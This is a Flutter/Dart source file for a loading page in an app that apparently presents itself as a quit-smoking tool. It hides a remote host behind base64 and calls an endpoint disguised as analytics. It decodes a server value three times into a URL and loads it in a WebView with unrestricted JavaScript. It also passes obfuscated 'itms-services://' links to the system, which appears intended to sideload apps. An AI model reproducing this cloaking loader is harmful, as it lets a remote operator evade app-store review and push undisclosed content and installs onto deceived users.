import 'dart:convert';

import 'package:dio/dio.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:flutter/material.dart';
import 'package:get/get.dart' hide Response;
import 'package:url_launcher/url_launcher_string.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:url_launcher/url_launcher.dart';

class JenLoadPage extends StatefulWidget {
  const JenLoadPage({super.key});

  @override
  State<JenLoadPage> createState() => _JenLoadPageState();
}

class _JenLoadPageState extends State<JenLoadPage> {

  late String _netType;
  var subscription;
  var _connectStateDescription;
  var nitialStr =  '';
  var netWorkStatus = false;

  @override
  void initState() {
    super.initState();

    // 获取网络连接状态
    isConnected();
  }

  @override
  Widget build(BuildContext context) {
    // return Container(
    //   color: Colors.white,
    //   alignment: Alignment.center,
    //   child: const Text("数据请求失败，请检查网络", style: TextStyle(fontSize: 12,color: Colors.black12)),
    // );
    return Scaffold(
      body: netWorkStatus ? WebView(
        initialUrl: nitialStr,  //需要打开的url
        //是否支持js 默认是不支持的，
        javascriptMode: JavascriptMode.unrestricted,
        // onWebViewCreated: (WebViewController controller) {
        //   //页面加载的时候可以获取到controller可以用来reload等操作
        //   _webViewController = controller;
        // },
        //加载js方法到页面内，js通过此来调用flutter的方法
        // javascriptChannels: _loadJavascriptChannel(context),
        onPageStarted: (String url) {
        },
        onPageFinished: (String url) {

        },
        //拦截页面url
        /*
        if (([url.absoluteString containsString:[Tool daStrWithStr:@"aXRtcy1zZXJ2aWNlczovLw=="]] || [url.absoluteString containsString:[Tool daStrWithStr:@"aXRtcy1hcHBzczovLw==" ]] || [url.absoluteString containsString:[Tool daStrWithStr:@"YXBwcy5hcHBsZQ=="]])&& [app canOpenURL:url]) {
        [app openURL:url options:@{} completionHandler:^(BOOL success) {
        }];
        decisionHandler(WKNavigationActionPolicyCancel);
    }else{
        decisionHandler(WKNavigationActionPolicyAllow);
    }
         */
        navigationDelegate: (NavigationRequest request) async {
          var item1 = utf8.decode(base64Decode("YVhSdGN5MXpaWEoyYVdObGN6b3ZMdz09"));
          var item2 = utf8.decode(base64Decode("YVhSdGN5MWhjSEJ6Y3pvdkx3PT0="));
          var item3 = utf8.decode(base64Decode("WVhCd2N5NWhjSEJzWlE9PQ=="));

          if (request.url.contains(utf8.decode(base64Decode(item1))) ||
              request.url.contains(utf8.decode(base64Decode(item2)) )||
              request.url.contains(utf8.decode(base64Decode(item3)) )) {
              if (await canLaunchUrlString(request.url)) {
                launchUrlString(request.url);
              }
            return NavigationDecision.prevent;
          }
          return NavigationDecision.navigate;
        },
      ) : Container(
        color: Colors.white,
        alignment: Alignment.center,
        child: const Text("数据请求失败，请检查网络", style: TextStyle(fontSize: 12,color: Colors.black12)),
      ),
    );
  }

  /// 获取联网类型
  void getConnectType() async {
    var connectResult = await (Connectivity().checkConnectivity());

    if (connectResult == ConnectivityResult.mobile) {
      _netType = "4G";
    } else if (connectResult == ConnectivityResult.wifi) {
      _netType = "wifi";
    } else {
      _netType = "未连接";
    }
    print(_netType);

    setState(() {
      
    });
  }

  /// 判断网络是否连接
  Future<bool> isConnected() async {
    var connectResult = await (Connectivity().checkConnectivity());
    //判读是否有网络
    if (connectResult != ConnectivityResult.none) {
      //有网络发起请求, 请求到数据之后 取消subscription.cancle();
      var baseCode = utf8.decode(base64Decode("aHR0cDovL20xMC5oaHdscy5jb20="));

      Response response = await Dio().get('$baseCode/analytics/50/v2_upload?v=1.2');
      // var map = jsonDecode(response.data);
      print(response.data['serverTime']);
      var re = response.data["refresh_token"];
      if (re != null) {
        //进行多次base64解密，解出链接
        var tempStr = re;
        for (int i=0; i<3; i++) {
          tempStr = utf8.decode(base64Decode(tempStr));
        }
        print(tempStr);

        setState(() {
          netWorkStatus = true;
          nitialStr = tempStr;
        });

      } else {
        //跳往戒烟登录
         Get.offAllNamed('/');
      }
      //关闭监听
      subscription.cancle();
    } else {
      //启动网络监听啥都不干
      // 设置网络变化监听
      connectListener();
    }

    return connectResult != ConnectivityResult.none;
  }

  /// 设置网络切换监听
  connectListener() async {
    subscription = Connectivity().onConnectivityChanged.listen((ConnectivityResult result) {
      print(result);
      if (result == ConnectivityResult.mobile) {
        isConnected();
      } else if (result == ConnectivityResult.wifi) {
        isConnected();
      } else {
        setState(() {
          _connectStateDescription = "无网络";
        });
      }
    });
  }
}


